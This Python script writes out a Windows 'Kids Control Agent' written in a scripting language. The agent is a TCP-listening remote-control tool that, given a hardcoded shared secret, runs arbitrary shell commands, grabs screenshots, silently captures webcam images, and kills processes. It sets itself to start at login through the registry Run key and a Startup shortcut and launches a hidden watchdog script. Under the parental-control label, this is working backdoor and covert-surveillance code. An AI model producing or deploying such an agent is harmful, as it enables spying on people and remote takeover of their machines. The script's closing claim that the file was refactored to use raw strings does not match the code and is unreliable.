import re

new_content = """# =============================================================================
# child_app.dz ?" Kids Control Agent (Server-Side)
# =============================================================================

use net
use process
use file
use json
use thread

let TCP_PORT   = 8888

let _hostname = ""
try
    _hostname = process.exec("hostname")["stdout"].strip()
catch e end      
let UDP_BEACON_PORT   = 8889
let HOSTS_FILE        = "C:\\Windows\\System32\\drivers\\etc\\hosts"

fn runPowerShell(script)
    let tmpFile = "__kc_tmp.ps1"
    file.write(tmpFile, script)
    let result  = process.exec("powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File " + tmpFile)
    try file.delete(tmpFile) catch e end
    return result["stdout"].strip()
end

fn wmicValue(query)
    let r     = process.exec(query)
    let lines = r["stdout"].split("\\n")
    for line in lines
        let t = line.strip()
        if t.contains("=") and not t.startsWith("=")
            let idx = t.index("=")
            return t.slice(idx + 1, t.length()).strip()
        end
    end
    return ""
end

try
    let exePath = process.exec("powershell -Command \\"(Get-Process -Id $PID).Path\\"")["stdout"].strip()
    if exePath.endsWith(".exe")
        process.exec("reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v KidsControlAgent /t REG_SZ /d \\"\\\\\\"" + exePath + "\\\\\\"\\" /f")
    end
catch e end

fn cmdSysinfo()
    let hostname  = ""
    let osCaption = ""
    let cpu       = ""
    let ramTotal  = ""
    let ramFree   = ""
    let username  = ""
    let bootTime  = ""

    try hostname  = process.exec("hostname")["stdout"].strip() catch e end
    try username  = process.exec("whoami")["stdout"].strip()   catch e end
    try osCaption = wmicValue("wmic os get Caption /value")    catch e end
    try cpu       = wmicValue("wmic cpu get Name /value")      catch e end
    try
        let bytes   = num(wmicValue("wmic ComputerSystem get TotalPhysicalMemory /value"))
        ramTotal    = str(int(bytes / 1073741824.0)) + " GB"
    catch e end
    try
        let kb      = num(wmicValue("wmic OS get FreePhysicalMemory /value"))
        ramFree     = str(int(kb / 1048576.0)) + " GB"
    catch e end
    try bootTime  = wmicValue("wmic os get LastBootUpTime /value").slice(0, 14) catch e end

    let info = {
        "hostname": hostname,
        "username": username,
        "os":       osCaption,
        "cpu":      cpu,
        "ram_total": ramTotal,
        "ram_free":  ramFree,
        "boot_time": bootTime
    }
    return "SYSINFO:" + json.encode(info)
end

fn cmdScreenshot()
    let script = `
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $s.Width, $s.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
$thumb = $bmp.GetThumbnailImage($s.Width / 2, $s.Height / 2, $null, [intptr]::Zero)
$ms = New-Object System.IO.MemoryStream
$thumb.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
Write-Host ([Convert]::ToBase64String($ms.ToArray()))
$g.Dispose(); $bmp.Dispose(); $thumb.Dispose(); $ms.Dispose()
`
    let b64 = runPowerShell(script)
    return "SCREENSHOT:" + b64
end

fn cmdWebcam()
    let script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Cam {
    [DllImport("avicap32.dll")]
    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
    [DllImport("user32", EntryPoint="SendMessage")]
    public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
}
"@
$hwnd = [Cam]::capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, [IntPtr]::Zero, 0)
[Cam]::SendMessage($hwnd, 1034, 0, 0) | Out-Null
Start-Sleep -Milliseconds 800
[Cam]::SendMessage($hwnd, 1084, 0, 0) | Out-Null
[Cam]::SendMessage($hwnd, 1054, 0, 0) | Out-Null
[Cam]::SendMessage($hwnd, 1035, 0, 0) | Out-Null
Add-Type -AssemblyName System.Windows.Forms
$img = [System.Windows.Forms.Clipboard]::GetImage()
if ($img -ne $null) {
    $ms = New-Object System.IO.MemoryStream
    $img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    Write-Host ([Convert]::ToBase64String($ms.ToArray()))
    $img.Dispose(); $ms.Dispose()
} else {
    Write-Host "NO_WEBCAM"
}
`
    let tmpFile = "__kc_cam.ps1"
    file.write(tmpFile, script)
    let result = process.exec("powershell -STA -ExecutionPolicy Bypass -NoProfile -NonInteractive -File " + tmpFile)["stdout"].strip()
    try file.delete(tmpFile) catch e end
    return "WEBCAM:" + result
end

fn cmdActiveWindow()
    let script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Win {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@
$hwnd = [Win]::GetForegroundWindow()
$title = New-Object System.Text.StringBuilder 256
if ([Win]::GetWindowText($hwnd, $title, 256) -gt 0) {
    Write-Host $title.ToString()
} else {
    Write-Host "None/Desktop"
}
`
    let res = runPowerShell(script)
    return "ACTIVE_WINDOW:" + res
end

fn cmdTasks()
    let r = process.exec("tasklist /FO CSV /NH")
    return "TASKS:" + r["stdout"]
end

fn cmdKill(name)
    process.exec("taskkill /F /IM " + name)
    return "OK:KILL:" + name
end

fn cmdMsg(text)
    let escaped = text.replace("\\"", "'")
    let script  = `
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("${escaped}", "Message from Parent") | Out-Null
`
    runPowerShell(script)
    return "OK:MSG"
end

fn cmdBlock(domain)
    try
        let hosts   = file.read(HOSTS_FILE)
        let entry   = "127.0.0.1 " + domain
        let entryWww = "127.0.0.1 www." + domain
        if not hosts.contains(entry)
            file.write(HOSTS_FILE, hosts + "\\r\\n" + entry + "\\r\\n" + entryWww)
        end
        return "OK:BLOCK:" + domain
    catch e
        return "ERR:ADMIN_REQUIRED"
    end
end

fn cmdUnblock(domain)
    try
        let hosts   = file.read(HOSTS_FILE)
        let lines   = hosts.split("\\n")
        let filtered = []
        for line in lines
            let t = line.strip()
            if not t.contains(domain)
                filtered.append(line)
            end
        end
        file.write(HOSTS_FILE, filtered.join("\\n"))
        return "OK:UNBLOCK:" + domain
    catch e
        return "ERR:ADMIN_REQUIRED"
    end
end

fn cmdSetSchedule(limitHour)
    file.write("C:\\\\Users\\\\Public\\\\kc_schedule.txt", limitHour)
    return "OK:SCHEDULE"
end

let SECRET = "KIDS_CTRL_2026"

fn dispatch(raw)
    let parts = raw.split("|||")
    if parts.length() < 2 or parts[0] != SECRET
        return "ERR:UNAUTHORIZED"
    end
    let cmd = parts[1].strip()
    print("[Agent] Received: " + cmd.slice(0, 80))

    if cmd == "PING"
        return "PONG:" + _hostname
    elif cmd == "SYSINFO"
        return cmdSysinfo()
    elif cmd == "LOCK"
        process.exec("rundll32.exe user32.dll,LockWorkStation")
        return "OK:LOCK"
    elif cmd == "SHUTDOWN"
        process.exec("shutdown /s /t 5")
        return "OK:SHUTDOWN"
    elif cmd == "RESTART"
        process.exec("shutdown /r /t 5")
        return "OK:RESTART"
    elif cmd == "SCREENSHOT"
        return cmdScreenshot()
    elif cmd == "WEBCAM"
        return cmdWebcam()
    elif cmd == "ACTIVE_WINDOW"
        return cmdActiveWindow()
    elif cmd == "TASKS"
        return cmdTasks()
    elif cmd.startsWith("KILL:")
        return cmdKill(cmd.slice(5, cmd.length()).strip())
    elif cmd.startsWith("MSG:")
        return cmdMsg(cmd.slice(4, cmd.length()))
    elif cmd.startsWith("BLOCK:")
        return cmdBlock(cmd.slice(6, cmd.length()).strip())
    elif cmd.startsWith("UNBLOCK:")
        return cmdUnblock(cmd.slice(8, cmd.length()).strip())
    elif cmd.startsWith("SCHEDULE:")
        file.write("C:\\\\Users\\\\Public\\\\kc_schedule.txt", cmd.slice(9, cmd.length()).strip())
        return "OK:SCHEDULE"
    elif cmd.startsWith("EXEC:")
        let shellCmd = cmd.slice(5, cmd.length())
        let result   = process.exec(shellCmd)
        return "EXEC_RESULT:" + result["stdout"] + result["stderr"]
    else
        return "ERR:UNKNOWN_COMMAND:" + cmd
    end
end

fn setupWatchdog()
    try
        process.exec("taskkill /F /IM wscript.exe /FI \\"WINDOWTITLE eq kc_watchdog\\"")
    catch e end

    let script = `
@echo off
:loop
tasklist /FI "IMAGENAME eq djazair.exe" 2>NUL | find /I /N "djazair.exe">NUL
if "%ERRORLEVEL%"=="1" (
    tasklist /FI "IMAGENAME eq main.exe" 2>NUL | find /I /N "main.exe">NUL
    if "%ERRORLEVEL%"=="1" (
        REM Agent killed
    )
)
timeout /t 5 /nobreak > NUL
goto loop
`
    try
        file.write("C:\\\\Users\\\\Public\\\\kc_wd.bat", script)
        file.write("C:\\\\Users\\\\Public\\\\kc_wd.vbs", "Set sh = CreateObject(\\"WScript.Shell\\")\\nsh.Run \\"cmd /c C:\\\\Users\\\\Public\\\\kc_wd.bat\\", 0, False")
        process.exec("wscript C:\\\\Users\\\\Public\\\\kc_wd.vbs")
    catch e end
end
setupWatchdog()

fn setupStartup()
    let exepath = process.exec("powershell -Command \\"(Get-Process -Id $PID).Path\\"")["stdout"].strip()
    if exepath.endsWith(".exe") and not exepath.endsWith("djazair.exe")
        let ps = `
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KidsControl.lnk")
$Shortcut.TargetPath = "${exepath}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
`
        let psFile = "__kc_startup.ps1"
        file.write(psFile, ps)
        process.exec("powershell -ExecutionPolicy Bypass -File " + psFile)
        try file.delete(psFile) catch e end
    end
end
setupStartup()

let server = new net.tcpServer(fn(client, ip, port)
    print("[Agent] Connection from " + ip + ":" + str(port))
    let raw = Null
    try
        raw = client.receive(131072)    # 128 KB buffer
    catch e
        raw = Null
    end

    if !isNull(raw) and raw != ""
        let response = dispatch(raw)
        try
            client.send(response)
        catch e
            print("[Agent] Send error: " + str(e))
        end
    end

    print("[Agent] Connection closed with " + ip)
    client.close()
end)

let monitorCode = `
use file
use datetime
use process
let SCHEDULE_FILE = "C:\\\\Users\\\\Public\\\\kc_schedule.txt"
while True
    try
        if file.isFile(SCHEDULE_FILE)
            let limitHour = num(file.read(SCHEDULE_FILE).strip())
            let h = datetime.now().hour()
            if (h >= limitHour or h < 6) and limitHour > 0
                process.exec("rundll32.exe user32.dll,LockWorkStation")
            end
        end
    catch e end
    process.sleep(60.0)
end
`
thread.spawnCode(monitorCode)

print("================================================")
print("  Kids Control Agent ?" TCP port " + str(TCP_PORT))
print("  Hostname: " + _hostname)
print("================================================")
server.listen(TCP_PORT)
"""

with open("ChildApp/main.dz", "w", encoding="utf-8") as f:
    f.write(new_content)

print("ChildApp/main.dz refactored to use raw strings and interpolations.")
